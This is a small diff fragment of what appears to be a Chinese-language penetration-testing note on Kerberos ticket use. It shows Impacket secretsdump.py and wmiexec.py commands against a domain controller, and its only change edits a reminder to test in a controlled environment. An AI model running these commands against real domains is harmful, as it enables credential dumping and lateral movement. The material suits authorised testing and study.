@@ -24,4 +24,4 @@ secretsdump.py -k -no-pass dc01.domain.local
 wmiexec.py -k -no-pass dc01.domain.local
 ```
 
-小记录：票据测试要严格控制环境，记录域 SID、加密类型、票据有效期和使用范围。
+票据测试要严格控制环境，记录域 SID、加密类型、票据有效期和使用范围。
